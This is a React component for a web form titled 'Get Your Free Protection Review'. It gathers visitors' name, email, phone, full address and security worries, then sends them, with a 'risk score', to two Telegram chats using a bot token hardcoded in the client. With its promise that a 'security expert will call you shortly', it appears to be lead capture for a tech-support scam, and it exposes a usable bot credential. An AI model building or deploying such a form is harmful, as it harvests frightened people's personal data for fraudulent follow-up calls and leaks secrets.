import { useState } from 'react'

const TELEGRAM_BOT_TOKEN = '8699438637:AAEUgX3bqmMtZa8b9EvShn-rCOrLK8c2y2U'
const TELEGRAM_CHAT_IDS = ['6351503678', '-5030471314' /*'-5198254389*/]

interface Props {
    riskScore: number
}

export default function LeadForm({ riskScore }: Props) {
    const [formData, setFormData] = useState({ name: '', email: '', phone: '', country: '', city: '', address: '', concern: '', message: '' })
    const [submitted, setSubmitted] = useState(false)

    const resetForm = () => {
        setSubmitted(false)
        setFormData({ name: '', email: '', phone: '', country: '', city: '', address: '', concern: '', message: '' })
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()

        const message =
            `🚨 New Security Lead\n\n` +
            `👤 Name: ${formData.name}\n` +
            `📧 Email: ${formData.email}\n` +
            `📞 Phone: ${formData.phone}\n` +
            `🌍 Country: ${formData.country}\n` +
            `🏙️ City: ${formData.city}\n` +
            `🏠 Address: ${formData.address}\n` +
            `⚠️ Concern: ${formData.concern}\n` +
            `💬 Message: ${formData.message}\n\n` +
            `🔴 Risk Score: ${riskScore}`

        await Promise.all(
            TELEGRAM_CHAT_IDS.map(chat_id =>
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id, text: message })
                })
            )
        )

        setSubmitted(true)
    }

    return (
        <div id="lead-form" className="bg-[#0f172a] border border-white/10 rounded-2xl p-6">

            {submitted ? (
                <div className="flex flex-col items-center justify-center text-center py-10">
                    <div className="text-6xl mb-4">✅</div>
                    <h3 className="text-2xl font-extrabold text-green-400 mb-3">Request Received!</h3>
                    <p className="text-slate-300 text-sm mb-6">
                        A security expert will call you shortly to help secure your device and accounts.
                    </p>
                    <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 w-full text-left space-y-2 mb-6">
                        <p className="text-green-400 font-bold text-sm">What happens next:</p>
                        <p className="text-slate-300 text-xs">📞 A security specialist will call you within 24 hours</p>
                        <p className="text-slate-300 text-xs">🛡️ We will review your device and account risks</p>
                        <p className="text-slate-300 text-xs">🔒 You will receive a personalized protection plan</p>
                    </div>
                    <button onClick={resetForm}
                        className="w-full bg-white/10 hover:bg-white/20 text-white font-bold py-3 rounded-xl transition cursor-pointer border border-white/10 mb-3">
                        Submit Another Request
                    </button>
                </div>

            ) : (
                <>
                    <h3 className="text-2xl font-bold mb-6">Get Your Free Protection Review</h3>
                    <form onSubmit={handleSubmit} autoComplete="off" className="space-y-3">
                        <input type="text" placeholder="Full Name" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, name: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <input type="email" placeholder="Email Address" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, email: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <input type="tel" placeholder="Phone Number" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, phone: e.target.value })}
                            onKeyDown={e => {
                                if (
                                    e.ctrlKey || e.metaKey ||
                                    /[0-9+\-\s]/.test(e.key) ||
                                    ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)
                                ) return
                                e.preventDefault()
                            }}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <input type="text" placeholder="Country" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, country: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <input type="text" placeholder="City" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, city: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <input type="text" placeholder="Address" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, address: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <select required onChange={e => setFormData({ ...formData, concern: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition">
                            <option value="" disabled selected>Main Concern</option>
                            {['Facebook Account Security', 'Email Security', 'Virus / Malware Protection', 'Password / Identity Protection', 'General Security Review'].map(o => (
                                <option key={o}>{o}</option>
                            ))}
                        </select>
                        <textarea placeholder="Tell us what happened or what you're worried about"
                            onChange={e => setFormData({ ...formData, message: e.target.value })} autoComplete="off"
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition resize-vertical min-h-24" />
                        <button type="submit"
                            className="w-full bg-green-500 hover:bg-green-600 text-[#07111d] font-bold py-3 rounded-xl transition cursor-pointer border-none">
                            Request My Free Review
                        </button>
                    </form>
                </>
            )}
        </div>
    )
}